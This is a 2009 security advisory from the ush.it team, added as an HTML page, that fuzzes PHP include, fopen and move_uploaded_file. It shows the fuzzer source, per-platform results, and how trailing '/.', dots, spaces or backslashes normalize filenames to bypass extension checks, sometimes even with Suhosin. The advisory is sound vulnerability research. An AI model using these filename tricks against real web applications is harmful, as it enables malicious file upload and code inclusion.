@@ -1,0 +1,457 @@
+<html>
+<head>
+<title>PHP filesystem attack vectors - Take Two</title>
+<pre>
+PHP filesystem attack vectors - Take Two
+
+ Name              PHP filesystem attack vectors - Take Two
+ Systems Affected  PHP and PHP+Suhosin
+ Vendor            http://www.php.net/
+ Advisory          http://www.ush.it/team/ush/hack-phpfs/phpfs_mad_2.txt
+ Authors           Giovanni &quot;evilaliv3&quot; Pellerano (evilaliv3 AT ush DOT it)
+                   Antonio &quot;s4tan&quot; Parata (s4tan AT ush DOT it)
+                   Francesco &quot;ascii&quot; Ongaro (ascii AT ush DOT it)
+                   Alessandro &quot;jekil&quot; Tanasi (alessandro AT tanasi DOT it)
+ Date              20090725
+
+I)    Introduction
+II)   PHP arbitrary Local File Inclusion testing
+III)  PHP arbitrary Local File Inclusion results
+IV)   PHP arbitrary File Open testing
+V)    PHP arbitrary File Open results
+VI)   PHP arbitrary Remote File Upload testing
+VII)  PHP arbitrary Remote File Upload results
+VIII) Conclusions
+IX)   References
+
+I) Introduction
+
+This is the second part and continuation of our previous &quot;PHP filesystem
+attack vectors&quot; [1] research.
+
+Working with s4tan and ascii on the &quot;SugarCRM 5.2.0e Remote Code
+Execution&quot; advisory [2] we noticed a strange behaviour on Windows OS:
+trying to upload a file named &quot;a.php.&quot; results in just &quot;a.php&quot;.
+
+Analyzing this we noticed that every time an application, or manually,
+was trying to open or save a file with one ore more dots at the end,
+Windows was not denying the operation, but it was removing the dots in a
+transparent way.
+
+Mindful readers probably have already spotted the issue.
+
+We wanted to take our time for a deeper investigation about what
+normalization issues were available and how to take advantage of them
+in order to exploit arbitrary local file inclusion/handling and uploads
+functionalities (not only on Windows OS but also on GNU/Linux and *BSD).
+
+Below you can find the sources of two simple &quot;academic&quot; fuzzers, later
+results are discussed and finally POCs and conclusions are proposed.
+
+II) PHP arbitrary Local File Inclusion testing
+
+This tests include(), include_once(), require(), require_once() and
+similiar functions.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+alfi_fuzzer.php:
+
+&lt;?php
+
+error_reporting(0);
+
+$InterestingFile = &quot;test_alfi.php&quot;;
+$fh = @fopen($InterestingFile, 'w+');
+fwrite($fh, &quot;&lt;?php ?&gt;&quot;);
+fclose($fh);
+
+for ($i = 1; $i &lt; 256; $i++) {
+ $chri = chr($i);
+ for ($j = 0; $j &lt; 256; $j++) {
+  $chrj = chr($j);
+  for ($k = 0; $k &lt; 256; $k++) {
+    $chrk = chr($k);
+    if($chri.$chrj.$chrk == '://') continue;
+    if ($j == 0) $FuzzyFile = $InterestingFile.$chri;
+    else if ($k == 0) $FuzzyFile = $InterestingFile.$chri.$chrj;
+    else $FuzzyFile = $InterestingFile.$chri.$chrj.$chrk;
+    if(include($FuzzyFile)) {
+        print($i.&quot; &quot;.$j.&quot; &quot;.$k.&quot; [&quot;.$FuzzyFile.&quot;]\n&quot;);
+        fclose($fh);
+    }
+    if($j == 0) break;
+  }
+ }
+}
+
+unlink($InterestingFile);
+
+?&gt;
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+Note: This code and the one that will be presented in section IV only
+makes use of chars from the ASCII extended table (256 chars) to limit the
+combinations because our intent was to test not only a malicious ending
+char but a whole ending &quot;extension&quot; of 3 bytes.
+
+A better fuzzer would include UTF-8. In the test we also do not
+consider \x00, because this vector is already known [3, 4].
+
+III) PHP arbitrary Local File Inclusion results
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-pl0-Gentoo
+
+PHPFS_MAD2 $ php alfi_fuzzer.php
+47 46 46 [test_alfi.php/.]
+47 47 47 [test_alfi.php//.]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-pl0-Gentoo + Suhosin-Patch 0.9.27
+
+PHPFS_MAD2 $ php alfi_fuzzer.php
+
+[ NO RESULTS ]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-FreeBSD 7.3 + Suhosin-Patch 0.9.7
+
+PHPFS_MAD2 $ php alfi_fuzzer.php
+
+[ NO RESULTS ]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;-
+
+PHP 5.3.0 Windows XP (WampServer 2.0i install)
+
+C:\PHPFS_MAD2&gt; php alfi_fuzzer.php
+! Valid chars are: \x20 ( ), \x22 (&quot;), \x2E (.), \x3C (&lt;), \x3E (&gt;)
+! Valid strings are all combinations of the above chars.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.3.0 Windows Server 2008 (WampServer 2.0i install)
+
+C:\PHPFS_MAD2&gt; php alfi_fuzzer.php
+! Valid chars are: \x20 ( ), \x22 (&quot;), \x2E (.), \x3C (&lt;), \x3E (&gt;)
+! Valid strings are all combinations of the above chars.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+IV) PHP arbitrary File Open testing
+
+This tests fopen() and similiar functions.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+afo_fuzzer.php:
+
+&lt;?php
+
+error_reporting(0);
+
+$MaliciousFile = &quot;test_afo.php&quot;;
+
+for ($i = 1; $i &lt; 256; $i++) {
+ $chri = chr($i);
+ for ($j = 0; $j &lt; 256; $j++) {
+  $chrj = chr($j);
+  for ($k = 0; $k &lt; 256; $k++) {
+    if ($j == 0) $FuzzyFile = $MaliciousFile.$chri;
+    else if ($k == 0) $FuzzyFile = $MaliciousFile.$chri.$chrj;
+    else $FuzzyFile = $MaliciousFile.$chri.$chrj.chr($k);
+    $fh = @fopen($FuzzyFile, 'w+');
+    if ($fh != FALSE) {
+        fwrite($fh, $FuzzyFile);
+        fclose($fh);
+        if (file_exists($MaliciousFile)) {
+            if ($j == 0) print($i.&quot; &quot;);
+            else if ($k == 0) print($i.&quot; &quot;.$j.&quot; &quot;);
+            else $FuzzyFile = print($i.&quot; &quot;.$j.&quot; &quot;.$k.&quot; &quot;);
+            print(&quot;[&quot;.file_get_contents($MaliciousFile).&quot;]\n&quot;);
+            unlink($MaliciousFile);
+        } else
+            unlink($FuzzyFile);
+    }
+    if($j == 0)
+        break;
+  }
+ }
+}
+
+?&gt;
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+V) PHP arbitrary File Open Fuzzer results
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-pl0-Gentoo
+
+PHPFS_MAD2 $ php afo_fuzzer.php
+47 46 [test_afo.php/.]
+47 47 46 [test_afo.php//.]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-pl0-Gentoo + Suhosin-Patch 0.9.27
+
+PHPFS_MAD2 $ php afo_fuzzer.php
+
+[ NO RESULTS ]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;-
+
+PHP 5.2.10-FreeBSD 7.3 + Suhosin-Patch 0.9.7
+
+PHPFS_MAD2 $ php afo_fuzzer.php
+
+47 46 [test_afo.php/.]
+47 47 46 [test_afo.php//.]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;-
+
+PHP 5.3.0 Windows XP (WampServer 2.0i install)
+
+C:\PHPFS_MAD2&gt; php afo_fuzzer.php
+
+! Valid chars are: \x2E (.), \x2F (/), \x5C (\)
+! Valid strings are all combinations of the above chars.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.3.0 Windows Server 2008 (WampServer 2.0i install)
+
+C:\PHPFS_MAD2&gt; php afo_fuzzer.php
+
+! Valid chars are: \x2E (.), \x2F (/), \x5C (\)
+! Valid strings are all combinations of the above chars.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+VI) PHP arbitrary Remote File Upload testing
+
+This tests move_uploaded_file() and similiar functions.
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+upload.php:
+
+&lt;?php
+
+error_reporting(0);
+
+$MaliciousFile = &quot;evil.php&quot;;
+
+if (isset($_GET['fuzzy'])) {
+  $FuzzyDestination = $MaliciousFile.$_GET['fuzzy'];
+  move_uploaded_file($_FILES['userfile']['tmp_name'], $FuzzyDestination);
+  printf($FuzzyDestination);
+  if (file_exists($MaliciousFile)) {
+          echo &quot;SUCCESS&quot;;
+          unlink($MaliciousFile);
+          exit();
+  } else {
+          unlink($FuzzyDestination);
+  }
+}
+
+echo &quot;FAIL&quot;;
+
+?&gt;
+
+arfu_fuzzer.sh:
+
+#!/bin/bash
+
+touch &quot;uploadtest.txt&quot;
+url=&quot;http://127.0.0.1/uploads/upload.php?fuzzy=&quot;
+
+for i in {1..255}; do
+ xi=&quot;%`printf %02x $i`&quot;
+ for j in {0..255}; do
+  xj=&quot;%`printf %02x $j`&quot;
+  for k in {0..255}; do
+   xk=&quot;%`printf %02x $k`&quot;
+
+   ext=&quot;$xi$xj$xk&quot;
+   [ $k -eq 0 ] &amp;&amp; ext=&quot;$xi$xj&quot;
+   [ $k -eq 0 ] &amp;&amp; [ $j -eq 0 ] &amp;&amp; ext=&quot;$xi&quot;
+
+   response=`curl -kis -F &quot;userfile=@uploadtest.txt;&quot; $url$ext | grep \
+SUCCESS | wc -l`
+
+   if [ &quot;$response&quot; == &quot;1&quot; ]; then
+     echo &quot;Found: $i $j $k -&gt; ($ext)&quot;;
+   fi
+
+   [ $j -eq 0 ] &amp;&amp; break
+
+  done
+ done
+done
+
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+VII) PHP arbitrary Remote File Upload results
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-pl0-Gentoo
+
+PHPFS_MAD2 $ sh test_arfu.sh
+
+FOUND: 47 0 0 -&gt; (/)
+FOUND: 47 46 0 -&gt; (/.)
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.2.10-pl0-Gentoo + Suhosin-Patch 0.9.27
+
+PHPFS_MAD2 $ sh test_arfu.sh
+
+FOUND: 47 0 0 -&gt; (/)
+FOUND: 47 46 0 -&gt; (/.)
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;-
+
+PHP 5.2.10-FreeBSD 7.3 + Suhosin-Patch 0.9.7
+
+PHPFS_MAD2 $ sh test_arfu.sh
+
+FOUND: 47 46 0 -&gt; (/.)
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;-
+
+PHP 5.3.0 Windows XP (WampServer 2.0i install)
+
+PHPFS_MAD2 $ sh test_arfu.sh
+
+[ All the combinations of (space), ., /, \ are valid ones. ]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+PHP 5.3.0 Windows Server 2008 (WampServer 2.0i install)
+
+PHPFS_MAD2 $ sh test_arfu.sh
+
+[ All the combinations of (space), ., /, \ are valid ones. ]
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+VIII) Conclusions
+
+We found that it's possible to take advantage of filename normalization
+routines in order to bypass common web application security routines,
+detailed below:
+
+- On GNU/Linux both (include|require)(_once)? functions will convert
+  &quot;foo.php&quot; followed by one or more sequences of \x2F (/) and \x2E (.)
+  back to &quot;foo.php&quot;.
+  This does not work if Suhosin patch is applied.
+
+- On GNU/Linux the fopen function will convert &quot;foo.php&quot; followed by one
+  or more sequences of \x2F (/) and \x2E (.) back to &quot;foo.php&quot;.
+  This does not work if Suhosin patch is applied.
+
+- On GNU/Linux move_uploaded_file function will convert &quot;foo.php&quot;
+  followed by one or more sequences of \x2F (/) and \x2E (.) back to
+  &quot;foo.php&quot;.
+  This does work anyway *also* if Suhosin patch is applied.
+
+- On FreeBSD the fopen function will convert &quot;foo.php&quot; followed by one
+  or more sequences of \x2F (/) and \x2E (.) back to &quot;foo.php&quot;.
+  This does work anyway *also* if Suhosin patch is applied.
+  Suhosin is shipped in the the default install.
+
+- On FreeBSD the move_uploaded_file function will convert &quot;foo.php&quot;
+  followed by one or more sequences of \x2F (/) and \x2E (.) back to
+  &quot;foo.php&quot;.
+  This does work anyway *also* if Suhosin patch is applied.
+  Suhosin is shipped in the the default install.
+
+- On Windows OS both (include|require)(_once)? functions will convert
+  &quot;foo.php&quot; followed by one or more of the chars \x20 ( ), \x22 (&quot;),
+  \x2E (.), \x3C (&lt;), \x3E (&gt;) back to &quot;foo.php&quot;.
+
+- On Windows OS the fopen function will convert &quot;foo.php&quot; followed by
+  one or more of the chars \x2E (.), \x2F (/), \x5C (\) back to
+  &quot;foo.php&quot;.
+
+- On Windows OS move_uploaded_file function will convert &quot;foo.php&quot;
+  followed by one or more of the chars \x2E (.), \x2F (/), \x5C (\)
+  back to &quot;foo.php&quot;.
+
+  We have observed that some particular strings like &quot;foo.php./&quot; or
+  &quot;foo.php.\&quot; force Windows to create a file called &quot;foo.php.&quot;. It
+  seems that Windows' functions do not contemplate the existence of
+  a file with dots at the end (perhaps Windows hackers can better
+  comment on this).
+
+  All functions on that file will fail their attempt, so that it's not
+  possible to easily delete or rename that file (one has to do del *
+  or similiar).
+
+IX) References
+
+[1] http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/
+    http://www.ush.it/team/ush/hack-phpfs/phpfs_mad.txt
+[2] http://www.ush.it/team/ush/hack-sugarcrm_520e/adv.txt
+[3] http://www.securiteam.com/securitynews/5FP0C0KJPQ.html
+[4] http://ha.ckers.org/blog/20060914/php-vulnerable-to-null-byte-injection/
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+Credits (Out of band)
+
+This article has been bought to you by the ush.it team. Giovanni
+&quot;evilaliv3&quot; Pellerano, Antonio &quot;s4tan&quot; Parata and Francesco &quot;ascii&quot;
+Ongaro are the ones who spent most hours on it with the precious help
+of Alessandro &quot;Jekil&quot; Tanasi, Florin &quot;Slippery&quot; Iamandi and many other
+friends.
+
+Giovanni &quot;evilaliv3&quot; Pellerano
+web site: http://www.ush.it/, http://www.evilaliv3.org/
+mail: evilaliv3 AT ush DOT it
+
+Antonio &quot;s4tan&quot; Parata
+web site: http://www.ush.it/
+mail: s4tan AT ush DOT it
+
+Francesco &quot;ascii&quot; Ongaro
+web site: http://www.ush.it/
+mail: ascii AT ush DOT it
+
+Alessandro &quot;jekil&quot; Tanasi
+web site: http://www.tanasi.it/
+mail: alessandro AT tanasi DOT it
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+Legal Notices
+
+Copyright (c) 2009 Francesco &quot;ascii&quot; Ongaro
+
+Permission is granted for the redistribution of this alert
+electronically. It may not be edited in any way without mine express
+written consent. If you wish to reprint the whole or any
+part of this alert in any other medium other than electronically,
+please email me for permission.
+
+Disclaimer: The information in the article is believed to be accurate
+at the time of publishing based on currently available information. Use
+of the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with regard to this information. Neither the
+author nor the publisher accepts any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+
+# milw0rm.com [2009-07-28]</pre>
+</html>
